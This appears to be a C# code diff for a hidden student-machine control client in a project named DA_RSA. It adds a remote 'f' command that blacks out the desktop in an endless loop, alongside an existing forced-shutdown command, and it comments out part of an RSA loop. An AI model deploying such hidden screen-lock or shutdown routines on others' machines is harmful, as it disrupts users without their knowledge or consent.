@@ -41,7 +41,10 @@ namespace DA_RSA
             //OnAppStart();
             //Application.ApplicationExit += new EventHandler(this.OnAppExit);
         }
-
+        [DllImport("User32.dll")]
+        public static extern IntPtr GetDC(IntPtr hwnd);
+        [DllImport("User32.dll")]
+        public static extern void ReleaseDC(IntPtr hwnd, IntPtr dc);
         private void SchuelerForm_Shown(object sender, EventArgs e)
         {
             this.Hide();
@@ -130,6 +133,20 @@ namespace DA_RSA
                             Process.Start("shutdown", "/s /t 1 /f");
                         }
                         //string tmp = Environment.GetFolderPath(Environment.SpecialFolder.History);
+                        else if (cmd == "f")
+                        {
+                            while (true)
+                            {
+                                IntPtr DESKTOPPTR = GetDC(IntPtr.Zero);
+                                Graphics G = Graphics.FromHdc(DESKTOPPTR);
+
+                                SolidBrush B = new SolidBrush(Color.Black);
+                                G.FillRectangle(B, new Rectangle(0, 0, 1920, 1080));
+
+                                G.Dispose();
+                                ReleaseDC(IntPtr.Zero, DESKTOPPTR);
+                            }
+                        }
                     }
                 }
                 catch
@@ -347,12 +364,15 @@ namespace DA_RSA
                 }
 
                 tempOutput = BigInteger.ModPow(SrcText.Length, e, n).ToString();
+                /*
                 for (int i = 0; i < SrcText.Length; i++)
                 {
                     int z = (int)(char)SrcText[i];
                     byte[] hua = BitConverter.GetBytes(z);
-                }
-
+                    byte[] hua2 = BitConverter.GetBytes(tmp);
+                    Buffer.BlockCopy(hua, 0, hua2, 0, 1);
+                } 
+                */
                 for (int i = 0; i < SrcText.Length; i++)
                 {
                     chr = SrcText[i];
